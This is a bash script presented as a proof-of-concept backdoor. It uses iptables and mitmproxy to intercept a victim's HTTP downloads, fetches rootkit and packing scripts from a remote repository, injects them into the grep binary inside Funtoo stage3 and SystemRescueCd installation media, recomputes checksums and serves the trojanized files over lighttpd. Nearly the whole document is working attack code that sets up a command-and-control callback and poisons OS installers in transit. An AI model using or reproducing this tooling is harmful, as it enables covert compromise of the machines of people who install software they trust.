#!/bin/bash
#
# Copyright terabit 2016
# Copyright kaneda  2016
#
# Last updated: 2016-03-31
# Description: Proof of concept backdoor, currently only
#              tested on Funtoo
#set -x
# Dependencies
LANG="en_US.UTF-8"
EXEC_PORTAGE="emerge -u pip dialog cdrtools squashfs-tools lighttpd"
EXEC_APT="apt-get install dialog lighttpd python-pip squashfs-tools genisoimage"
EXEC_YUM="yum install dialog lighttpd python-pip squashfs-tools mkisofs cdrtools"
DEPENDENCIES=("bash" "cp" "mv" "rm" "ls" "mkdir" "tar" "awk" "grep" "sed" "md5sum" "sha256sum" "ip" "iptables" "which" "whoami" 
             "curl" "mount" "chmod" "dialog" "pip" "lighttpd" "unsquashfs" "mksquashfs" "mitmproxy")


function usage {
    echo "Please specify the client IP and the command and control server"
    echo "Usage: $0 <victim_ip> <cnc>"
    exit 1
}

function popup {
    dialog --msgbox "$1"  7 40
}

#meh...version checks would be nice
function dependency_check {
  for dep in "${DEPENDENCIES[@]}";
   do
     if ! command -v "$dep" > /dev/null;then
         echo "Missing dependency $dep , exiting..."
         exit
     fi
   done
}
#include openssl,netcat,wget here if they aren't installed
function install_packages {
  if [ $(which dialog) ]; then
   dialog --yesno "Install dependencies?" 7 35
     if [ $? -ge 1 ]; then
     return
     fi
  fi   
      if [ $(which emerge) ]; then
          $EXEC_PORTAGE
      elif [ $(which apt-get) ]; then
          $EXEC_APT
      elif [ $(which yum) ]; then
          $EXEC_YUM
      else
          echo "You must have one of emerge, apt-get, or yum to install dependencies"
          echo "We're continuing anyways, good luck!"
          
      fi
      
  install_pypi
}
function fetch {
   if [ $# -lt 2 ]; then
   wget "$1"
     if [ $? -ge 1 ];then
         echo "Error fetching $1" 
         exit
     fi

   else 
   wget "$1" -O "$2"
     if [ $? -ge 1 ];then
         echo "Error fetching $1 to $2" 
         exit
     fi
   fi
}

function install_pypi {
    if [ $(which pip) ]; then
        pip install mitmproxy 
    else
        echo "Couldn't find pip, needed to install mitmproxy and twisted."
        exit 1
    fi
}

function setup_funtoo (){
RESCUE_BASE="systemrescuecd-x86-4.7.1.iso"
STAGE3_BASE="stage3-latest.tar.xz"
ISO_ARGS="-o ../out/${RESCUE_BASE} -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V ${RESCUE_BASE} ."
if [ $(which mkisofs) ]; then
    ISO_EXEC="mkisofs"
else
    ISO_EXEC="genisoimage"
fi

if [ -e "out/"$RESCUE_BASE ] && [ -e "out/"$STAGE3_BASE ] && [ -e "out/"$STAGE3_BASE".hash.txt" ];then
  dialog --yesno "Existing installation media files found in the output directory. Continue funtoo setup?" 9 40
   if [ $? -ge 1 ]; then
      return
   fi
fi

mkdir backdoor-stage3 backdoor-iso-ro backdoor-iso-rw out
if [ $? -ge 1 ];then
     echo "Error creating work directories" 
     exit
fi

if [ -e $STAGE3_BASE ] && [ -e $RESCUE_BASE ]; then
  dialog --yesno "Existing original installation media found, skip download?" 7 40
     if [ $? -ge 1 ]; then
# Get all the packages
fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/$STAGE3_BASE 
fetch http://build.funtoo.org/distfiles/sysresccd/$RESCUE_BASE
     fi
 else
fetch http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/$STAGE3_BASE 
fetch http://build.funtoo.org/distfiles/sysresccd/$RESCUE_BASE
fi

# Mount the ISO
mount -oloop ./${RESCUE_BASE} ./backdoor-iso-ro
if [ $? -ge 1 ]; then
   echo "Error mounting ISO $RESCUE_BASE"
   exit
else
   echo "Please stand by,extracting files from installation media..."
fi

cp -a ./backdoor-iso-ro/* ./backdoor-iso-rw/ &&
tar -C backdoor-stage3 -xf ./stage3-latest.tar.xz &&
unsquashfs -d ./backdoor-squash/ ./backdoor-iso-ro/sysrcd.dat

if [ $? -ge 1 ];then
     echo "Error extracting stage3 and/or ISO" 
     exit
fi


echo "fetching mitmproxy inline script and backdoor script."
# Get the backdoor scripts
curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/redirect.py > redirect.py &&
curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/pack.sh > ./pack.sh &&
curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/rtkt.sh > ./rtkt.sh &&
chmod a+x ./pack.sh

if [ $? -ge 1 ];then
     echo "Error fetching scripts" 
     exit
fi

echo "Applying Backdoor."
# Update the scripts with the command and control
sed -i "s/REPLACEME/$CNC/" ./rtkt.sh
sed -i "s/REPLACEME/$INTERFACE_IP/" redirect.py

# I guess I wasn't too creative here... a million ways to do this, I picked the simplest one I could think of.
cp ./backdoor-squash/bin/grep ./ && cp ./backdoor-stage3/bin/grep3 ./

./pack.sh ./rtkt.sh ./grep && ./pack.sh ./rtkt.sh ./grep3

if ! [ -e ./grep.out ] || ! [ -e ./grep3.out ];then
     echo "Error applying backdoor" 
     exit
fi

cp -f ./grep.out ./backdoor-squash/bin/grep && cp -f ./grep3.out ./backdoor-stage3/bin/grep && 
chmod a+x ./backdoor-squash/bin/grep && chmod a+x ./backdoor-stage3/bin/grep

if [ $? -ge 1 ]; then
     echo "Error copying back backdoored binary" 
     exit
fi

echo "Re-packaging backdoored installation media, you should probably go get a coffee or something, this will take a while..."
# Pack backdoored files
cd backdoor-stage3 && tar -cJf ../out/$STAGE3_BASE * && cd ../backdoor-squash && 
mksquashfs * ../sysrcd-backdoored.dat && cd ../backdoor-iso-rw

if [ $? -ge 1 ]; then
   "Error re-packing backdoored stage3"
   exit
fi

rm sysrcd* && mv ../sysrcd-backdoored.dat ./sysrcd.dat && 
md5sum sysrcd.dat > sysrcd.md5 && $ISO_EXEC $ISO_ARGS

if [ $? -ge 1 ]; then
   "Error re-packing backdoored ISO"
   exit
fi

cd ../out && sha256sum $STAGE3_BASE >  $STAGE3_BASE".hash.txt" && cd .. 
umount backdoor-iso-ro

}

function setup_ubuntu(){

popup "Ubuntu setup - Not implemented yet"
}

function setup_mint(){

popup "Mint setup - Not implemented yet"

}

function setup_debian(){
popup "Debian setup - Not implemented yet"


}

function setup_mageia(){
popup "Mageia setup - Not implemented yet"


}

function setup_fedora(){
popup "Fedora setup - Not implemented yet"


}

function setup_opensuse(){
popup "openSUSE setup - Not implemented yet"


}

function setup_arch(){

popup "Arch setup - Not implemented yet"

}

function setup_centos(){
popup "Centos setup - Not implemented yet"


}

function setup_pclinuxos(){
popup "PCLinuxOS setup - Not implemented yet"


}

function setup_slackware(){
popup "Slackware setup - Not implemented yet"


}

function setup_gentoo(){

popup "Gentoo setup - Not implemented yet"

}

function setup_freebsd(){
popup "Freebsd setup - Not implemented yet"


}



###### Main

if [ $# -lt 2 ]; then
    usage
fi


VICTIM_IP="$1"
CNC="$2"

if  [ $(whoami) !=  "root" ];then
   echo "Not running as root,exiting..."
   exit
fi

install_packages


dependency_check

if  [ $(uname -o) != "GNU/Linux" ];then

    popup "WARNING: only GNU/Linux is supported at this time, will continue execution,good luck."
fi


# Pick victim IP, find what interface it is on, setup
# iptables rules accordingly for the interface
#
# Example:
# victim: 172.16.10.81
# ip neigh show to 172.16.10.81
# 172.16.10.81 dev eth1 lladdr ac:ef:ac:e0:c3:01 REACHABLE

if [[ "$(ip neigh show to $VICTIM_IP)" == "" ]]; then
    INTERFACE="eth0"
else
    INTERFACE="$(ip neigh show to $VICTIM_IP | awk '{print $3}')"
fi

INTERFACE_IP="$(ip -4 addr show $INTERFACE | grep -oP "(?<=inet).*(?=/)"  | sed -e 's/^[ \t]*//')"

if [ $? -ge 1 ]; then
   INTERFACE_IP="0.0.0.0"
fi




# Ideally you will set this up on your own system and just wget
# the backdoored stage3 and iso.
#
# However in this case I will use the compromised network
# device to setup the backdoored files.

mkdir work  # not doing && cd work in case work already exists.
cd work

tmpchecklist=/tmp/checklist.$$

dialog --checklist "What operating system distributions would you like to backdoor?:" 25 40 15 \
        1 "Funtoo" off \
        2 "Ubuntu" off \
        3 "Mint" off \
        4 "Debian" off \
        5 "Mageia" off \
        6 "Fedora" off \
        7 "openSUSE" off \
        8 "Arch" off \
        9 "Centos" off \
        10 "PCLinuxOS" off \
        11 "Slackware" off \
        12 "Gentoo" off \
        13 "FreeBSD" off 2>"${tmpchecklist}" 
        
 if [ $? -ge 1 ]; then
    echo "Bye"
    
 fi
 
        selections=`cat $tmpchecklist`

 for choice in $selections;
  do
    case   "$choice" in
       1)
       setup_funtoo
       ;;
       2) 
       setup_ubuntu 
       ;;
       3) 
       setup_mint 
       ;;
       4) 
       setup_debian 
       ;;
       5)
       setup_mageia 
       ;;
       6) 
       setup_fedora 
       ;;
       7) 
       setup_opensuse 
       ;;
       8) 
       setup_arch 
       ;;
       9) 
       setup_centos 
       ;;
       10) 
       setup_pclinuxos 
       ;;
       11) 
       setup_slackware 
       ;;
       12) 
       setup_gentoo ;;
       13) 
       setup_freebsd 
       ;;
       *)
       popup "Error $selections"
       exit
   esac
done

    
ls -l out

# Start and fork lighttpd web server to host the backdoored files
#
# You would normally run this somewhere on the internet with a
# similar domain as the file server, either that or you can modify
# dns response to point to this target machine to fool users
# if you specify a CNC outside of the compromised box it will work fine.
curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/lighttpd.conf > lighttpd.conf &&
echo "Starting lighttpd web server started on port 81" &&
sed -i "s#PWD#${PWD}#" lighttpd.conf
     if [ $? -ge 1 ];then
         echo "Error fetching and configuring lighttpd" 
         exit
     fi
     
lighttpd -f lighttpd.conf&

if [ $? -ne 0 ]; then
    popup "Failed to bind 81, check that port isn't in use and try again"
    exit 1
fi

# Setup mitmproxy/mitmdump
# configure iptables rules accordingly for the interface


# Set it up
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080 
     if [ $? -ge 1 ];then
         echo "Error applying iptables rule on $INTERFACE" 
         exit
     fi
     
mitmproxy --anticache -T -s ./redirect.py

echo "Ready as can be, try downloading a target file and see if it works :)"

# Profit
